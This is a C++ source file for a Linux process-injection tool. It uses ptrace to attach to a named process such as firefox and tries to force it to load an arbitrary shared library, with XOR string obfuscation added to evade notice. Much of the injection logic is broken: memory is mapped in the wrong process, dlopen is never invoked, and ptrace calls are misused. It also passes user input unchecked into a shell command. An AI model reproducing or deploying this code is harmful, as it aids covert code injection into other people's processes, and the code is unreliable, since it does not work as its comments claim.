#include <iostream>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <cstring>
#include <sys/wait.h>
#include <cstdlib>
#include <cstring>
#include <string>
#include <stdio.h>

#define print(format, ...) fprintf(stderr, format, __VA_ARGS__)

// XOR Encryption/Obfuscation function
std::string xorEncrypt(const std::string& data, char key) {
    std::string result = data;
    for (size_t i = 0; i < data.length(); ++i) {
        result[i] = data[i] ^ key; // XOR with the key
    }
    return result;
}

// Decrypt function (for encrypted data)
std::string xorDecrypt(const std::string& data, char key) {
    return xorEncrypt(data, key); // XOR decryption is same as encryption
}

// Inject the shared object (SO) into the target process
void InjectLibrary(pid_t target_pid, const char* library_path) {
    // Attach to the target process
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        exit(EXIT_FAILURE);
    }
    waitpid(target_pid, NULL, 0); // Wait for the process to stop

    // Find the address of dlopen() in the target process (used to load the shared object)
    void* dlopen_addr = dlsym(RTLD_DEFAULT, "dlopen");
    if (!dlopen_addr) {
        perror("dlsym dlopen");
        exit(EXIT_FAILURE);
    }

    // Allocate memory in the target process for the library path
    size_t path_len = strlen(library_path) + 1;
    void* remote_addr = mmap(NULL, path_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (remote_addr == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    // Write the encrypted library path to the allocated memory in the target process
    std::string encryptedPath = xorEncrypt(library_path, 0xAA);  // XOR encryption (basic obfuscation)
    if (ptrace(PTRACE_POKETEXT, target_pid, remote_addr, encryptedPath.c_str()) == -1) {
        perror("ptrace POKETEXT");
        exit(EXIT_FAILURE);
    }

    // Execute dlopen() in the target process with the library path
    struct iovec remote_iov = {&dlopen_addr, sizeof(dlopen_addr)};
    if (ptrace(PTRACE_POKETEXT, target_pid, remote_iov.iov_base, remote_iov.iov_len) == -1) {
        perror("ptrace POKETEXT");
        exit(EXIT_FAILURE);
    }

    // Detach from the target process and let it continue
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    print("Successfully injected the library into process %d\n", target_pid);
}

// Function to get the PID of a process by name (can be obfuscated with XOR as well)
pid_t GetProcessId(const std::string& process_name) {
    std::string xor_name = xorEncrypt(process_name, 0xAA); // XOR obfuscation
    std::string command = "pgrep " + xor_name;
    FILE* fp = popen(command.c_str(), "r");
    if (fp == nullptr) {
        perror("popen");
        return -1;
    }

    char pid_buffer[10];
    if (fgets(pid_buffer, sizeof(pid_buffer), fp) != nullptr) {
        pid_t pid = atoi(pid_buffer);
        fclose(fp);
        return pid;
    }

    fclose(fp);
    return -1;
}

int main() {
    // Obfuscated inputs (using XOR encryption for hiding strings)
    std::string encrypted_process_name, encrypted_library_path;

    // Taking user input for process name and shared library path
    print("Enter the name of the process (e.g., 'firefox') to inject into: ");
    std::cin >> encrypted_process_name;
    print("Enter the full path of the shared object to inject (e.g., '/home/user/mylib.so'): ");
    std::cin >> encrypted_library_path;

    // Decrypt the inputs
    std::string decrypted_process_name = xorDecrypt(encrypted_process_name, 0xAA);
    std::string decrypted_library_path = xorDecrypt(encrypted_library_path, 0xAA);

    // Check if the library path exists
    if (access(decrypted_library_path.c_str(), F_OK) == -1) {
        print("Library file does not exist! Exiting...\n");
        return EXIT_FAILURE;
    }

    // Find the process ID for the target process
    pid_t target_pid = GetProcessId(decrypted_process_name);
    if (target_pid == -1) {
        print("Process not found!\n");
        return EXIT_FAILURE;
    }

    // Inject the library into the target process
    InjectLibrary(target_pid, decrypted_library_path.c_str());

    return EXIT_SUCCESS;
}
